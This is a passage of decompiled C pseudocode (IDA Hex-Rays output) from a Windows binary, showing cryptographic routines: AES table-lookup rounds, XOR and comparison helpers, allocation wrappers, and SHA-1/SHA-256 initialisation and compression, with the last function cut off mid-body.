          *((_DWORD *)v29 + 5) = v33;
          Sizea += 16;
        }
        while ( v25 < v27 );
        v4 = this;
        v24 = v46;
      }
      v34 = v24[v25 + 1];
      v24[v25] = *(int *)((char *)&dword_491500[2 * (unsigned __int8)RijnDael_AES_LONG_46E6E8[LOBYTE(v24[v25])]] + 3) ^ *(int *)((char *)&dword_491500[2 * (unsigned __int8)RijnDael_AES_LONG_46E6E8[BYTE1(v24[v25])]] + 2) ^ *(int *)((char *)&dword_491500[2 * (unsigned __int8)RijnDael_AES_LONG_46E6E8[(unsigned __int8)BYTE2(v24[v25])]] + 1) ^ dword_491504[2 * (unsigned __int8)RijnDael_AES_LONG_46E6E8[HIBYTE(v24[v25])]];
      v35 = *(int *)((char *)&dword_491500[2 * (unsigned __int8)RijnDael_AES_LONG_46E6E8[BYTE2(v34)]] + 1) ^ dword_491504[2 * (unsigned __int8)RijnDael_AES_LONG_46E6E8[HIBYTE(v34)]];
      v36 = BYTE1(v34);
      v37 = v24[v25 + 2];
      v24[v25 + 1] = *(int *)((char *)&dword_491500[2 * (unsigned __int8)RijnDael_AES_LONG_46E6E8[LOBYTE(v24[v25 + 1])]]
                            + 3) ^ *(int *)((char *)&dword_491500[2 * (unsigned __int8)RijnDael_AES_LONG_46E6E8[v36]] + 2) ^ v35;
      v38 = *(int *)((char *)&dword_491500[2 * (unsigned __int8)RijnDael_AES_LONG_46E6E8[BYTE2(v37)]] + 1) ^ dword_491504[2 * (unsigned __int8)RijnDael_AES_LONG_46E6E8[HIBYTE(v37)]];
      v39 = BYTE1(v37);
      v40 = v24[v25 + 3];
      v24[v25 + 2] = *(int *)((char *)&dword_491500[2 * (unsigned __int8)RijnDael_AES_LONG_46E6E8[LOBYTE(v24[v25 + 2])]]
                            + 3) ^ *(int *)((char *)&dword_491500[2 * (unsigned __int8)RijnDael_AES_LONG_46E6E8[v39]] + 2) ^ v38;
      v24[v25 + 3] = *(int *)((char *)&dword_491500[2 * (unsigned __int8)RijnDael_AES_LONG_46E6E8[LOBYTE(v24[v25 + 3])]]
                            + 3) ^ *(int *)((char *)&dword_491500[2
                                                                * (unsigned __int8)RijnDael_AES_LONG_46E6E8[BYTE1(v40)]]
                                          + 2) ^ *(int *)((char *)&dword_491500[2
                                                                              * (unsigned __int8)RijnDael_AES_LONG_46E6E8[BYTE2(v40)]]
                                                        + 1) ^ dword_491504[2
                                                                          * (unsigned __int8)RijnDael_AES_LONG_46E6E8[HIBYTE(v40)]];
      v41 = _byteswap_ulong(*v24);
      *v24 = _byteswap_ulong(v24[4 * v4[3]]);
      v24[4 * v4[3]] = v41;
      v42 = _byteswap_ulong(v24[1]);
      v24[1] = _byteswap_ulong(v24[4 * v4[3] + 1]);
      v24[4 * v4[3] + 1] = v42;
      v43 = _byteswap_ulong(v24[2]);
      v24[2] = _byteswap_ulong(v24[4 * v4[3] + 2]);
      v24[4 * v4[3] + 2] = v43;
      v44 = _byteswap_ulong(v24[3]);
      v24[3] = _byteswap_ulong(v24[4 * v4[3] + 3]);
      v24[4 * v4[3] + 3] = v44;
    }
    if ( sub_41F72B() )
      sub_41F28C(v24 + 4, (int)(v24 + 4), 16 * v4[3] - 16);
  }
}
// 42039D: variable 'v6' is possibly undefined
// 491500: using guessed type int dword_491500[];
// 491504: using guessed type int dword_491504[511];
// 491D00: using guessed type char byte_491D00;
// 491D01: using guessed type char byte_491D01;

//----- (00420B12) --------------------------------------------------------
char *__fastcall sub_420B12(int a1, int a2, char *Source, unsigned int a4, unsigned int a5, char a6)
{
  int v8; // edx
  void *v9; // ebp
  unsigned int v10; // ecx

  if ( Source == (char *)(a1 + (-a1 & 0xF)) && a5 <= 0x3C )
  {
    if ( a4 > a5 )
      memset(&Source[4 * a5], 0, 4 * (a4 - a5));
    return Source;
  }
  else
  {
    v9 = (void *)sub_409587(a1, a2, a5, 0);
    if ( a6 && a5 )
    {
      v10 = a4;
      if ( a5 < a4 )
        v10 = a5;
      memcpy_s(v9, 4 * a5, Source, 4 * v10);
    }
    sub_4092FE(a1, v8, Source, a4);
    return (char *)v9;
  }
}
// 420B80: variable 'v8' is possibly undefined

//----- (00420B8E) --------------------------------------------------------
int __cdecl sub_420B8E(int a1)
{
  int result; // eax

  while ( 1 )
  {
    result = sub_44F077(a1, 16);
    if ( result )
      break;
    sub_420BAC();
  }
  return result;
}

//----- (00420BAC) --------------------------------------------------------
int sub_420BAC()
{
  void (__cdecl *v0)(); // eax
  int (*v1)(void); // esi
  int pExceptionObject[3]; // [esp+4h] [ebp-Ch] BYREF

  v0 = std::set_new_handler(0);
  v1 = (int (*)(void))v0;
  if ( !v0 )
  {
    pExceptionObject[2] = 0;
    pExceptionObject[1] = (int)"bad allocation";
    pExceptionObject[0] = (int)&std::bad_alloc::`vftable';
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
  }
  std::set_new_handler(v0);
  return v1();
}
// 46DB74: using guessed type void *std::bad_alloc::`vftable';

//----- (00420BF0) --------------------------------------------------------
void *__cdecl sub_420BF0(size_t Size)
{
  void *result; // eax

  while ( 1 )
  {
    result = malloc(Size);
    if ( result )
      break;
    sub_420BAC();
  }
  return result;
}

//----- (00420C0B) --------------------------------------------------------
bool __cdecl sub_420C0B(unsigned int a1, unsigned int a2, unsigned int a3)
{
  unsigned int v3; // edi
  int v4; // ebx
  _BYTE *v5; // esi
  char v6; // al
  unsigned int v7; // edx
  unsigned int v8; // eax
  unsigned int v9; // ecx
  _DWORD *v10; // ebp
  int v11; // eax
  int v12; // eax
  unsigned int v14; // edi

  v3 = a1;
  v4 = 0;
  v5 = (_BYTE *)a2;
  if ( sub_40BDCB(a1, 4u) )
  {
    v6 = sub_40BDCB(a2, 4u);
    v7 = a3;
    if ( v6 )
    {
      v8 = 0;
      v9 = a3 >> 2;
      if ( a3 >> 2 )
      {
        v10 = (_DWORD *)a2;
        do
        {
          v11 = *v10 ^ *(_DWORD *)((char *)v10 + a1 - a2);
          ++v10;
          v4 |= v11;
          --v9;
        }
        while ( v9 );
        v3 = a1;
        v8 = a3 >> 2;
      }
      v12 = 4 * v8;
      v7 = a3 - v12;
      if ( a3 == v12 )
        return v4 == 0;
      v3 += v12;
      v5 = (_BYTE *)(v12 + a2);
      LOBYTE(v4) = BYTE1(v4) | BYTE2(v4) | HIBYTE(v4) | v4;
    }
  }
  else
  {
    v7 = a3;
  }
  if ( v7 )
  {
    v14 = v3 - (_DWORD)v5;
    do
    {
      LOBYTE(v4) = *v5 ^ v5[v14] | v4;
      ++v5;
      --v7;
    }
    while ( v7 );
  }
  return (_BYTE)v4 == 0;
}

//----- (00420CB2) --------------------------------------------------------
char __cdecl sub_420CB2(unsigned int a1, unsigned int a2, unsigned int a3, unsigned int a4)
{
  unsigned int v4; // ebx
  int v5; // eax
  unsigned int v6; // edi
  _BYTE *v7; // esi
  unsigned int v8; // ecx
  unsigned int v9; // eax
  unsigned int v10; // edx
  _DWORD *v11; // ebp
  unsigned int v12; // edi
  unsigned int v13; // ebx

  v4 = a1;
  LOBYTE(v5) = sub_40BDCB(a1, 4u);
  v6 = a2;
  if ( !(_BYTE)v5 )
  {
    v7 = (_BYTE *)a3;
    goto LABEL_11;
  }
  LOBYTE(v5) = sub_40BDCB(a2, 4u);
  v7 = (_BYTE *)a3;
  if ( !(_BYTE)v5 )
  {
LABEL_11:
    v8 = a4;
LABEL_12:
    if ( v8 )
    {
      v12 = v6 - (_DWORD)v7;
      v13 = v4 - (_DWORD)v7;
      do
      {
        LOBYTE(v5) = *v7 ^ v7[v12];
        v7[v13] = v5;
        ++v7;
        --v8;
      }
      while ( v8 );
    }
    return v5;
  }
  LOBYTE(v5) = sub_40BDCB(a3, 4u);
  v8 = a4;
  if ( !(_BYTE)v5 )
    goto LABEL_12;
  v9 = 0;
  v10 = a4 >> 2;
  if ( a4 >> 2 )
  {
    v11 = (_DWORD *)a3;
    do
    {
      *(_DWORD *)((char *)v11 + a1 - a3) = *v11 ^ *(_DWORD *)((char *)v11 + a2 - a3);
      ++v11;
      --v10;
    }
    while ( v10 );
    v8 = a4;
    v4 = a1;
    v9 = a4 >> 2;
  }
  v5 = 4 * v9;
  v8 -= v5;
  if ( v8 )
  {
    v4 += v5;
    v6 = v5 + a2;
    v7 = (_BYTE *)(v5 + a3);
    goto LABEL_12;
  }
  return v5;
}

//----- (00420D68) --------------------------------------------------------
char __cdecl sub_420D68(unsigned int a1, unsigned int a2, unsigned int a3)
{
  _BYTE *v3; // esi
  int v4; // eax
  unsigned int v5; // edi
  unsigned int v6; // ecx
  unsigned int v7; // edx
  unsigned int v8; // ebp
  _DWORD *v9; // ebx
  unsigned int v10; // edi

  v3 = (_BYTE *)a1;
  LOBYTE(v4) = sub_40BDCB(a1, 4u);
  v5 = a2;
  if ( !(_BYTE)v4 )
  {
    v6 = a3;
LABEL_10:
    if ( v6 )
    {
      v10 = v5 - (_DWORD)v3;
      do
      {
        LOBYTE(v4) = v3[v10];
        *v3++ ^= v4;
        --v6;
      }
      while ( v6 );
    }
    return v4;
  }
  LOBYTE(v4) = sub_40BDCB(a2, 4u);
  v6 = a3;
  if ( !(_BYTE)v4 )
    goto LABEL_10;
  v7 = a3 >> 2;
  v8 = 0;
  if ( a3 >> 2 )
  {
    v8 = a3 >> 2;
    v9 = (_DWORD *)a1;
    do
    {
      *v9 ^= *(_DWORD *)((char *)v9 + a2 - a1);
      ++v9;
      --v7;
    }
    while ( v7 );
    v3 = (_BYTE *)a1;
  }
  v4 = 4 * v8;
  v6 = a3 - 4 * v8;
  if ( v6 )
  {
    v3 += v4;
    v5 = v4 + a2;
    goto LABEL_10;
  }
  return v4;
}

//----- (00420DE5) --------------------------------------------------------
char sub_420DE5()
{
  if ( !byte_491D08 )
    sub_4254E3();
  return byte_491D0F;
}
// 491D08: using guessed type char byte_491D08;
// 491D0F: using guessed type char byte_491D0F;

//----- (00420DF9) --------------------------------------------------------
int __thiscall sub_420DF9(__m128i **this, __m128i *a2, unsigned int a3)
{
  unsigned int v4; // esi
  int *v5; // ebp
  int *v6; // ebx
  bool v8; // [esp+8h] [ebp-4h]

  if ( sub_420DE5() )
  {
    sub_428E46(this[46], a2, a3, 1);
    return a3 & 0x3F;
  }
  else
  {
    v8 = ((int (__thiscall *)(__m128i **))(*this)[4].m128i_i32[3])(this) == 0;
    v4 = a3;
    v5 = (int *)((int (__thiscall *)(__m128i **))(*this)[5].m128i_i32[2])(this);
    v6 = (int *)a2;
    do
    {
      if ( v8 )
      {
        sub_420F84(this[46]->m128i_i32, v6);
      }
      else
      {
        sub_41F28C(v5, (int)v6, 0x40u);
        sub_420F84(this[46]->m128i_i32, v5);
      }
      v4 -= 64;
      v6 += 16;
    }
    while ( v4 >= 0x40 );
  }
  return v4;
}

//----- (00420E8D) --------------------------------------------------------
int __thiscall sub_420E8D(__m128i **this, __m128i *a2, unsigned int a3)
{
  __m128i *v4; // eax
  unsigned int v5; // esi
  unsigned int *v6; // ebp
  unsigned int *v7; // ebx
  bool v9; // [esp+8h] [ebp-4h]

  LOBYTE(v4) = sub_420DE5();
  if ( (_BYTE)v4 )
  {
    sub_4290DD(v4, this[48], a2, a3, 1);
    return a3 & 0x3F;
  }
  else if ( sub_411C74() )
  {
    v5 = a3 & 0x3F;
    sub_422CF6(this[48], (unsigned int *)a2, a3 - v5);
  }
  else
  {
    v9 = ((int (__thiscall *)(__m128i **))(*this)[4].m128i_i32[3])(this) == 0;
    v5 = a3;
    v6 = (unsigned int *)((int (__thiscall *)(__m128i **))(*this)[5].m128i_i32[2])(this);
    v7 = (unsigned int *)a2;
    do
    {
      if ( v9 )
      {
        sub_421FFE(this[48], v7);
      }
      else
      {
        sub_41F28C(v6, (int)v7, 0x40u);
        sub_421FFE(this[48], v6);
      }
      v5 -= 64;
      v7 += 16;
    }
    while ( v5 >= 0x40 );
  }
  return v5;
}
// 420EAC: variable 'v4' is possibly undefined

//----- (00420F4A) --------------------------------------------------------
_DWORD *__cdecl sub_420F4A(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = 1732584193;
  a1[1] = -271733879;
  a1[2] = -1732584194;
  a1[3] = 271733878;
  a1[4] = -1009589776;
  return result;
}

//----- (00420F71) --------------------------------------------------------
void __cdecl sub_420F71(void *a1)
{
  qmemcpy(a1, &SHA256_Constants_46DF10, 0x20u);
}

//----- (00420F84) --------------------------------------------------------
int __cdecl sub_420F84(int *a1, int *a2)
{
  int v2; // edx
  int v3; // eax
  int v4; // edx
  int v5; // ebp
  int v6; // esi
  int v7; // ebx
  int v8; // eax
  int v9; // ebp
  int v10; // edi
  int v11; // eax
  int v12; // esi
  int v13; // edx
  int v14; // eax
  int v15; // edi
  int v16; // ebx
  int v17; // eax
  int v18; // edx
  int v19; // ebp
  int v20; // eax
  int v21; // ebx
  int v22; // esi
  int v23; // eax
  int v24; // ebp
  int v25; // edi
  int v26; // eax
  int v27; // esi
  int v28; // edx
  int v29; // eax
  int v30; // edi
  int v31; // ebx
  int v32; // eax
  int v33; // edx
  int v34; // ebp
  int v35; // eax
  int v36; // ebx
  int v37; // esi
  int v38; // eax
  int v39; // ebp
  int v40; // edi
  int v41; // eax
  int v42; // esi
  int v43; // edx
  int v44; // eax
  int v45; // edi
  int v46; // ebx
  int v47; // eax
  int v48; // edx
  int v49; // ebp
  int v50; // eax
  int v51; // ebx
  int v52; // esi
  int v53; // edi
  int v54; // ebp
  int v55; // edx
  int v56; // esi
  int v57; // ebp
  int v58; // edi
  int v59; // edx
  int v60; // ebx
  int v61; // esi
  int v62; // ebx
  int v63; // eax
  int v64; // edi
  int v65; // ebp
  int v66; // eax
  int v67; // ebx
  int v68; // edx
  int v69; // esi
  int v70; // ebp
  int v71; // eax
  int v72; // edx
  int v73; // edi
  int v74; // eax
  int v75; // esi
  int v76; // ebx
  int v77; // eax
  int v78; // edi
  int v79; // ebp
  int v80; // eax
  int v81; // ebx
  int v82; // edx
  int v83; // esi
  int v84; // ebp
  int v85; // eax
  int v86; // edx
  int v87; // edi
  int v88; // eax
  int v89; // esi
  int v90; // ebx
  int v91; // eax
  int v92; // edi
  int v93; // ebp
  int v94; // eax
  int v95; // ebx
  int v96; // edx
  int v97; // esi
  int v98; // ebp
  int v99; // eax
  int v100; // edx
  int v101; // edi
  int v102; // eax
  int v103; // esi
  int v104; // ebx
  int v105; // eax
  int v106; // edi
  int v107; // ebp
  int v108; // eax
  int v109; // ebx
  int v110; // edx
  int v111; // ebp
  int v112; // esi
  int v113; // edi
  int v114; // ebx
  int v115; // edx
  int v116; // ebp
  int v117; // ebp
  int v118; // esi
  int v119; // edi
  int v120; // ebx
  int v121; // ebp
  int v122; // esi
  int v123; // edi
  int v124; // ebx
  int v125; // eax
  int v126; // ebp
  int v127; // ecx
  int v128; // ecx
  int v129; // esi
  int v130; // edi
  int v131; // ebp
  int v132; // eax
  int v133; // ecx
  int v134; // esi
  int v135; // ebx
  int v136; // ecx
  int v137; // edi
  int v138; // ebp
  int v139; // ecx
  int v140; // ebx
  int v141; // edx
  int v142; // eax
  int v143; // ebp
  int v144; // esi
  int v145; // eax
  int v146; // edx
  int v147; // edi
  int v148; // eax
  int v149; // esi
  int v150; // ebx
  int v151; // eax
  int v152; // edi
  int v153; // ebp
  int v154; // eax
  int v155; // ebx
  int v156; // edx
  int v157; // eax
  int v158; // ebp
  int v159; // esi
  int v160; // eax
  int v161; // edx
  int v162; // edi
  int v163; // eax
  int v164; // esi
  int v165; // ebx
  int v166; // eax
  int v167; // edi
  int v168; // ebp
  int v169; // eax
  int v170; // ebx
  int v171; // edx
  int v172; // eax
  int v173; // ebp
  int v174; // esi
  int v175; // eax
  int v176; // edx
  int v177; // eax
  int v178; // ebx
  int v179; // edi
  int v180; // ebp
  int v181; // eax
  int v182; // ebp
  int v183; // edx
  int v184; // esi
  int v185; // edi
  int v186; // ebx
  int v187; // ecx
  int v188; // esi
  int v189; // ebp
  int v190; // esi
  int v191; // ebx
  int v192; // edx
  int v193; // eax
  int result; // eax
  int v195; // [esp+10h] [ebp-4Ch]
  int v196; // [esp+10h] [ebp-4Ch]
  int v197; // [esp+10h] [ebp-4Ch]
  int v198; // [esp+10h] [ebp-4Ch]
  int v199; // [esp+14h] [ebp-48h]
  int v200; // [esp+14h] [ebp-48h]
  int v201; // [esp+14h] [ebp-48h]
  int v202; // [esp+14h] [ebp-48h]
  int v203; // [esp+14h] [ebp-48h]
  int v204; // [esp+18h] [ebp-44h]
  int v205; // [esp+18h] [ebp-44h]
  int v206; // [esp+18h] [ebp-44h]
  int v207; // [esp+1Ch] [ebp-40h]
  int v208; // [esp+1Ch] [ebp-40h]
  int v209; // [esp+1Ch] [ebp-40h]
  int v210; // [esp+1Ch] [ebp-40h]
  int v211; // [esp+20h] [ebp-3Ch]
  int v212; // [esp+20h] [ebp-3Ch]
  int v213; // [esp+20h] [ebp-3Ch]
  int v214; // [esp+20h] [ebp-3Ch]
  int v215; // [esp+24h] [ebp-38h]
  int v216; // [esp+24h] [ebp-38h]
  int v217; // [esp+24h] [ebp-38h]
  int v218; // [esp+24h] [ebp-38h]
  int v219; // [esp+28h] [ebp-34h]
  int v220; // [esp+28h] [ebp-34h]
  int v221; // [esp+28h] [ebp-34h]
  int v222; // [esp+28h] [ebp-34h]
  int v223; // [esp+28h] [ebp-34h]
  int v224; // [esp+2Ch] [ebp-30h]
  int v225; // [esp+2Ch] [ebp-30h]
  int v226; // [esp+2Ch] [ebp-30h]
  int v227; // [esp+2Ch] [ebp-30h]
  int v228; // [esp+2Ch] [ebp-30h]
  int v229; // [esp+2Ch] [ebp-30h]
  int v230; // [esp+30h] [ebp-2Ch]
  int v231; // [esp+30h] [ebp-2Ch]
  int v232; // [esp+30h] [ebp-2Ch]
  int v233; // [esp+30h] [ebp-2Ch]
  int v234; // [esp+30h] [ebp-2Ch]
  int v235; // [esp+34h] [ebp-28h]
  int v236; // [esp+34h] [ebp-28h]
  int v237; // [esp+34h] [ebp-28h]
  int v238; // [esp+34h] [ebp-28h]
  int v239; // [esp+34h] [ebp-28h]
  int v240; // [esp+38h] [ebp-24h]
  int v241; // [esp+38h] [ebp-24h]
  int v242; // [esp+38h] [ebp-24h]
  int v243; // [esp+38h] [ebp-24h]
  int v244; // [esp+3Ch] [ebp-20h]
  int v245; // [esp+3Ch] [ebp-20h]
  int v246; // [esp+3Ch] [ebp-20h]
  int v247; // [esp+3Ch] [ebp-20h]
  int v248; // [esp+40h] [ebp-1Ch]
  int v249; // [esp+40h] [ebp-1Ch]
  int v250; // [esp+40h] [ebp-1Ch]
  int v251; // [esp+40h] [ebp-1Ch]
  int v252; // [esp+40h] [ebp-1Ch]
  int v253; // [esp+40h] [ebp-1Ch]
  int v254; // [esp+44h] [ebp-18h]
  int v255; // [esp+44h] [ebp-18h]
  int v256; // [esp+44h] [ebp-18h]
  int v257; // [esp+44h] [ebp-18h]
  int v258; // [esp+44h] [ebp-18h]
  int v259; // [esp+44h] [ebp-18h]
  int v260; // [esp+48h] [ebp-14h]
  int v261; // [esp+48h] [ebp-14h]
  int v262; // [esp+48h] [ebp-14h]
  int v263; // [esp+48h] [ebp-14h]
  int v264; // [esp+4Ch] [ebp-10h]
  int v265; // [esp+4Ch] [ebp-10h]
  int v266; // [esp+4Ch] [ebp-10h]
  int v267; // [esp+4Ch] [ebp-10h]
  int v268; // [esp+50h] [ebp-Ch]
  int v269; // [esp+50h] [ebp-Ch]
  int v270; // [esp+50h] [ebp-Ch]
  int v271; // [esp+50h] [ebp-Ch]
  int v272; // [esp+50h] [ebp-Ch]
  int v273; // [esp+54h] [ebp-8h]
  int v274; // [esp+54h] [ebp-8h]
  int v275; // [esp+54h] [ebp-8h]
  int v276; // [esp+54h] [ebp-8h]
  int v277; // [esp+54h] [ebp-8h]
  int v278; // [esp+54h] [ebp-8h]
  int v279; // [esp+54h] [ebp-8h]
  int v280; // [esp+54h] [ebp-8h]
  int v281; // [esp+54h] [ebp-8h]
  int v282; // [esp+58h] [ebp-4h]
  int v283; // [esp+58h] [ebp-4h]
  int v284; // [esp+58h] [ebp-4h]
  int v285; // [esp+58h] [ebp-4h]
  int v286; // [esp+58h] [ebp-4h]
  int v287; // [esp+58h] [ebp-4h]
  int v288; // [esp+58h] [ebp-4h]
  int v289; // [esp+58h] [ebp-4h]
  int v290; // [esp+58h] [ebp-4h]
  int v291; // [esp+58h] [ebp-4h]
  int v292; // [esp+58h] [ebp-4h]
  int v293; // [esp+64h] [ebp+8h]
  int v294; // [esp+64h] [ebp+8h]
  int v295; // [esp+64h] [ebp+8h]
  int v296; // [esp+64h] [ebp+8h]

  v2 = a1[1];
  v224 = *a2;
  v3 = v2 & (a1[2] ^ a1[3]);
  v4 = __ROR4__(v2, 2);
  v5 = a1[4] + __ROL4__(*a1, 5) + (a1[3] ^ v3) + *a2 + 1518500249;
  v219 = a2[1];
  v6 = v219 + __ROL4__(v5, 5) + (a1[2] ^ *a1 & (v4 ^ a1[2])) + a1[3] + 1518500249;
  v7 = __ROR4__(*a1, 2);
  v282 = a2[2];
  v8 = v282 + __ROL4__(v6, 5) + (v4 ^ v5 & (v7 ^ v4));
  v9 = __ROR4__(v5, 2);
  v10 = v8 + a1[2] + 1518500249;
  v248 = a2[3];
  v11 = v6 & (v7 ^ v9);
  v12 = __ROR4__(v6, 2);
  v13 = v248 + __ROL4__(v10, 5) + (v7 ^ v11) + v4 + 1518500249;
  v244 = a2[4];
  v14 = v244 + __ROL4__(v13, 5) + (v9 ^ v10 & (v12 ^ v9));
  v15 = __ROR4__(v10, 2);
  v16 = v14 + v7 + 1518500249;
  v240 = a2[5];
  v17 = v13 & (v15 ^ v12);
  v18 = __ROR4__(v13, 2);
  v19 = v240 + __ROL4__(v16, 5) + 1518500249 + (v12 ^ v17) + v9;
  v230 = a2[6];
  v20 = v16 & (v18 ^ v15);
  v21 = __ROR4__(v16, 2);
  v22 = v230 + __ROL4__(v19, 5) + 1518500249 + (v15 ^ v20) + v12;
  v235 = a2[7];
  v23 = v19 & (v21 ^ v18);
  v24 = __ROR4__(v19, 2);
  v25 = v235 + __ROL4__(v22, 5) + 1518500249 + (v18 ^ v23) + v15;
  v264 = a2[8];
  v26 = v22 & (v21 ^ v24);
  v27 = __ROR4__(v22, 2);
  v28 = v264 + __ROL4__(v25, 5) + 1518500249 + (v21 ^ v26) + v18;
  v260 = a2[9];
  v29 = v25 & (v27 ^ v24);
  v30 = __ROR4__(v25, 2);
  v31 = v260 + __ROL4__(v28, 5) + 1518500249 + (v24 ^ v29) + v21;
  v254 = a2[10];
  v32 = v27 ^ v28 & (v30 ^ v27);
  v33 = __ROR4__(v28, 2);
  v34 = v254 + __ROL4__(v31, 5) + 1518500249 + v32 + v24;
  v268 = a2[11];
  v35 = v31 & (v33 ^ v30);
  v36 = __ROR4__(v31, 2);
  v37 = v268 + __ROL4__(v34, 5) + 1518500249 + (v30 ^ v35) + v27;
  v273 = a2[12];
  v38 = v34 & (v36 ^ v33);
  v39 = __ROR4__(v34, 2);
  v40 = v273 + __ROL4__(v37, 5) + 1518500249 + (v33 ^ v38) + v30;
  v199 = a2[13];
  v41 = v37 & (v36 ^ v39);
  v42 = __ROR4__(v37, 2);
  v43 = v199 + __ROL4__(v40, 5) + 1518500249 + (v36 ^ v41) + v33;
  v195 = a2[14];
  v44 = v40 & (v42 ^ v39);
  v45 = __ROR4__(v40, 2);
  v46 = v195 + __ROL4__(v43, 5) + 1518500249 + (v39 ^ v44) + v36;
  v293 = a2[15];
  v47 = v43 & (v45 ^ v42);
  v48 = __ROR4__(v43, 2);
  v49 = v293 + __ROL4__(v46, 5) + 1518500249 + (v42 ^ v47) + v39;
  v204 = __ROL4__(v224 ^ v282 ^ v264 ^ v199, 1);
  v50 = v45 ^ v46 & (v48 ^ v45);
  v51 = __ROR4__(v46, 2);
  v52 = v204 + __ROL4__(v49, 5) + 1518500249 + v50 + v42;
  v207 = __ROL4__(v219 ^ v248 ^ v260 ^ v195, 1);
  v53 = v207 + __ROL4__(v52, 5) + 1518500249 + (v48 ^ v49 & (v51 ^ v48)) + v45;
  v225 = __ROR4__(v49, 2);
  v211 = __ROL4__(v282 ^ v244 ^ v254 ^ v293, 1);
  v54 = v48 + 1518500249 + v211 + __ROL4__(v53, 5) + (v51 ^ v52 & (v51 ^ v225));
  v215 = __ROL4__(v204 ^ v248 ^ v240 ^ v268, 1);
  v283 = __ROR4__(v52, 2);
  v55 = v51 + v215 + __ROL4__(v54, 5) + 1518500249 + (v53 & (v283 ^ v225) ^ v225);
  v249 = __ROR4__(v53, 2);
  v220 = __ROL4__(v207 ^ v244 ^ v230 ^ v273, 1);
  v56 = v225 + 1859775393 + v220 + __ROL4__(v55, 5) + (v54 ^ v249 ^ v283);
  v226 = __ROL4__(v211 ^ v240 ^ v235 ^ v199, 1);
  v57 = __ROR4__(v54, 2);
  v231 = __ROL4__(v215 ^ v230 ^ v264 ^ v195, 1);
  v58 = v283 + 1859775393 + v226 + __ROL4__(v56, 5) + (v55 ^ v57 ^ v249);
  v59 = __ROR4__(v55, 2);
  v60 = v59 ^ v57 ^ v56;
  v61 = __ROR4__(v56, 2);
  v236 = __ROL4__(v220 ^ v235 ^ v260 ^ v293, 1);
  v62 = v249 + 1859775393 + v231 + __ROL4__(v58, 5) + v60;
  v63 = v59 ^ v58 ^ v61;
  v64 = __ROR4__(v58, 2);
  v65 = v236 + __ROL4__(v62, 5) + 1859775393 + v63 + v57;
  v241 = __ROL4__(v204 ^ v226 ^ v264 ^ v254, 1);
  v66 = v241 + __ROL4__(v65, 5) + 1859775393 + (v62 ^ v64 ^ v61);
  v67 = __ROR4__(v62, 2);
  v68 = v66 + v59;
  v245 = __ROL4__(v207 ^ v231 ^ v260 ^ v268, 1);
  v69 = v245 + __ROL4__(v68, 5) + 1859775393 + (v65 ^ v67 ^ v64) + v61;
  v250 = __ROL4__(v211 ^ v236 ^ v254 ^ v273, 1);
  v70 = __ROR4__(v65, 2);
  v71 = v68 ^ v70 ^ v67;
  v72 = __ROR4__(v68, 2);
  v73 = v250 + __ROL4__(v69, 5) + 1859775393 + v71 + v64;
  v255 = __ROL4__(v215 ^ v241 ^ v268 ^ v199, 1);
  v74 = v72 ^ v70 ^ v69;
  v75 = __ROR4__(v69, 2);
  v76 = v255 + __ROL4__(v73, 5) + 1859775393 + v74 + v67;
  v261 = __ROL4__(v220 ^ v245 ^ v273 ^ v195, 1);
  v77 = v72 ^ v73 ^ v75;
  v78 = __ROR4__(v73, 2);
  v79 = v261 + __ROL4__(v76, 5) + 1859775393 + v77 + v70;
  v200 = __ROL4__(v226 ^ v250 ^ v199 ^ v293, 1);
  v80 = v200 + __ROL4__(v79, 5) + 1859775393 + (v76 ^ v78 ^ v75);
  v81 = __ROR4__(v76, 2);
  v82 = v80 + v72;
  v196 = __ROL4__(v204 ^ v231 ^ v255 ^ v195, 1);
  v83 = v196 + __ROL4__(v82, 5) + 1859775393 + (v79 ^ v81 ^ v78) + v75;
  v84 = __ROR4__(v79, 2);
  v294 = __ROL4__(v207 ^ v236 ^ v261 ^ v293, 1);
  v85 = v294 + __ROL4__(v83, 5) + 1859775393 + (v82 ^ v84 ^ v81);
  v86 = __ROR4__(v82, 2);
  v87 = v85 + v78;
  v205 = __ROL4__(v204 ^ v211 ^ v241 ^ v200, 1);
  v88 = v86 ^ v84 ^ v83;
  v89 = __ROR4__(v83, 2);
  v90 = v205 + __ROL4__(v87, 5) + 1859775393 + v88 + v81;
  v208 = __ROL4__(v207 ^ v215 ^ v245 ^ v196, 1);
  v91 = v86 ^ v87 ^ v89;
  v92 = __ROR4__(v87, 2);
  v93 = v208 + __ROL4__(v90, 5) + 1859775393 + v91 + v84;
  v212 = __ROL4__(v211 ^ v220 ^ v250 ^ v294, 1);
  v94 = v212 + __ROL4__(v93, 5) + 1859775393 + (v90 ^ v92 ^ v89);
  v95 = __ROR4__(v90, 2);
  v96 = v94 + v86;
  v216 = __ROL4__(v205 ^ v215 ^ v226 ^ v255, 1);
  v97 = v216 + __ROL4__(v96, 5) + 1859775393 + (v93 ^ v95 ^ v92) + v89;
  v98 = __ROR4__(v93, 2);
  v221 = __ROL4__(v208 ^ v220 ^ v231 ^ v261, 1);
  v99 = v221 + __ROL4__(v97, 5) + 1859775393 + (v96 ^ v98 ^ v95);
  v100 = __ROR4__(v96, 2);
  v101 = v99 + v92;
  v227 = __ROL4__(v212 ^ v226 ^ v236 ^ v200, 1);
  v102 = v100 ^ v98 ^ v97;
  v103 = __ROR4__(v97, 2);
  v104 = v227 + __ROL4__(v101, 5) + 1859775393 + v102 + v95;
  v232 = __ROL4__(v216 ^ v231 ^ v241 ^ v196, 1);
  v105 = v100 ^ v101 ^ v103;
  v106 = __ROR4__(v101, 2);
  v107 = v232 + __ROL4__(v104, 5) + 1859775393 + v105 + v98;
  v237 = __ROL4__(v221 ^ v236 ^ v245 ^ v294, 1);
  v108 = v104 ^ v106 ^ v103;
  v109 = __ROR4__(v104, 2);
  v242 = __ROL4__(v205 ^ v227 ^ v241 ^ v250, 1);
  v284 = v237 + __ROL4__(v107, 5) + 1859775393 + v108 + v100;
  v110 = v103 - 1894007588 + v242 + (v107 & v109 | v106 & (v107 | v109)) + __ROL4__(v284, 5);
  v246 = __ROL4__(v208 ^ v232 ^ v245 ^ v255, 1);
  v111 = __ROR4__(v107, 2);
  v112 = __ROR4__(v284, 2);
  v251 = __ROL4__(v212 ^ v237 ^ v250 ^ v261, 1);
  v285 = v106 - 1894007588 + v246 + (v284 & v111 | v109 & (v284 | v111)) + __ROL4__(v110, 5);
  v113 = __ROR4__(v110, 2);
  v256 = __ROL4__(v216 ^ v242 ^ v255 ^ v200, 1);
